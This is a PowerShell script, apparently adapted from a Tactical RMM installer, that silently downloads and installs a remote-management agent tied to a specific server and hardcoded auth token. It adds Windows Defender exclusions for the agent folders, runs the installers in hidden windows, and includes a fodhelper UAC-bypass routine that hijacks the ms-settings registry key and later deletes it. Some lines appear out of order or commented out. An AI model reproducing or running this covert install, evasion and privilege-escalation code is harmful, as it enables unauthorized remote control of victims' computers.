# author: https://github.com/bradhawkins85
$innosetup = 'tacticalagent-v2.6.2-windows-amd64.exe'
$api = '"https://api.cybriks.com"'
$clientid = '1'
$siteid = '1'
$agenttype = '"server"'
$power = 0
$rdp = 0
$ping = 0
$auth = '"a7af3b76db5d20a5e175fa3f157b7252127b122262a5a32d971f7165ce492453"'
#$auth = '"a0c8de860e91b73e70337f4cca8c20a29b14fd52e4a606b911578604af4c2ca3"'
$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.6.2/tacticalagent-v2.6.2-windows-amd64.exe'
$apilink = $downloadlink.split('/')

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$serviceName = 'tacticalrmm'
If (Get-Service $serviceName -ErrorAction SilentlyContinue) {
    write-host ('Tactical RMM Is Already Installed')
} Else {
    $OutPath = $env:TMP
    $output = $innosetup
    $installArgs = @('-m install --api ', "$api", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', "$agenttype", '--auth', "$auth")
    if ($power) {
        $installArgs += "--power"
    }
    if ($rdp) {
        $installArgs += "--rdp"
    }
    if ($ping) {
        $installArgs += "--ping"
    }
    Try
    {
        $DefenderStatus = Get-MpComputerStatus | select  AntivirusEnabled
        if ($DefenderStatus -match "True") {
            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'
            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'
        }
    }
    Catch {
        # pass
    }
    
    $X = 0
    do {
      Write-Output "Waiting for network"
      Start-Sleep -s 5
      $X += 1      
    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)
    
    if ($connectresult.TcpTestSucceeded -eq $true){
        Try
        {
            #Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
            #Start-Process -FilePath $OutPath\$output -ArgumentList ('/VERYSILENT /SUPPRESSMSGBOXES') -Wait
            #write-host ('Extracting...')
            #Start-Sleep -s 5
            #Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList $installArgs -Wait

            FodhelperUACBypass
            
            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output
            Start-Process -FilePath $OutPath\$output -ArgumentList '/VERYSILENT', '/SUPPRESSMSGBOXES' -WindowStyle Hidden -Wait
            Write-Host ('Extracting...')
            Start-Sleep -Seconds 5
            Start-Process -FilePath "C:\Program Files\TacticalAgent\tacticalrmm.exe" -ArgumentList ($installArgs + "--silent") -WindowStyle Hidden -Wait

            #Start-Sleep 3
            Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
            exit 0
        }
        Catch
        {
            $ErrorMessage = $_.Exception.Message
            $FailedItem = $_.Exception.ItemName
            Write-Error -Message "$ErrorMessage $FailedItem"
            exit 1
        }
        Finally
        {
            Remove-Item -Path $OutPath\$output
        }
    } else {
        Write-Output "Unable to connect to server"
    }
}
function FodhelperUACBypass(){ 
 Param (
           
        [String]$program = "cmd /c start C:\Windows\System32\cmd.exe" #default
       )
　
    #Create Registry Structure
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force
　
    #Start fodhelper.exe
    #Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
　
    #Cleanup
    #Start-Sleep 3
    #Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
　
}
